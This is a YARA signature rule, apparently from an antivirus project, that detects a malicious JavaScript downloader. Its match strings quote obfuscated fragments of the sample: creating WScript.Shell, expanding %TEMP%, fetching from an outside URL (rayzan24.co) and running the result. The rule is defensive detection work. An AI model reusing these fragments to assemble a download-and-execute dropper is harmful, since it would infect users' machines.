rule sig_20160427_4986524f3d80eacfa2217f48b89136b5 {
  meta:
    description = "datamaliciousorder - file 20160427_4986524f3d80eacfa2217f48b89136b5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1cc23a662bd990a32231d0e8424220b31aba66d5b043fb3090d72a475484c1ce"

  strings:
    $s1  = "function CipqjPobqt() {return YygokDefva[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"1sUR8I3" ascii
    $s2  = "function CipqjPobqt() {return YygokDefva[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"1sUR8I3" ascii
    $s3  = "function FbwhzBnhds(HfoxiJlpeh, GpnioSleqw){SokkdYqfuq = SokkdYqfuq * 1; return HfoxiJlpeh - GpnioSleqw;};" fullword ascii
    $s4  = "var YygokDefva = function MozdaVcbut() {return LzcyyXnnzv[SqeivAojrd](\"WScript\"+\".Shell\");}(), HvngaDdcgq = 11;" fullword ascii
    $s5  = "JvvmuEqjpx[ZnvpnJvdoj](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var LzcyyXnnzv = this[\"WScript\"];" fullword ascii
    $s7  = "if (JvvmuEqjpx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function EsynoLxlhm(){return JtotbEyodi + \"\";};" fullword ascii
    $s9  = "function FolcfHxnuv() {return ((QeegzNwoam == true) && (QeegzNwoam == KxzcpGkvkn)) ? 1 : SokkdYqfuq;};" fullword ascii
    $s10 = "KxzcpGkvkn = true; " fullword ascii
    $s11 = "var YwapoWicwp = false;" fullword ascii
    $s12 = "}while (HlzdzStybt);" fullword ascii
    $s13 = "function XvsliJylwp(AzhfoZmipf){YygokDefva[\"R\"+\"un\"](AzhfoZmipf, SokkdYqfuq, SokkdYqfuq);};" fullword ascii
    $s14 = "var QeegzNwoam = false;" fullword ascii
    $s15 = "function SjpsbQqdww(){return 23;};" fullword ascii
    $s16 = "var KxzcpGkvkn = false;" fullword ascii
    $s17 = "YwapoWicwp = true;" fullword ascii
    $s18 = "function UjgldWsrjf(){return SqeivAojrd;};" fullword ascii
    $s19 = "function PyqrwFwfhh(BrhkxKonnc) {var XcvxiTeqri = (1, 2, 3, 4, 5, BrhkxKonnc); return XcvxiTeqri;};" fullword ascii
    $s20 = "function RzcndHujrg()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}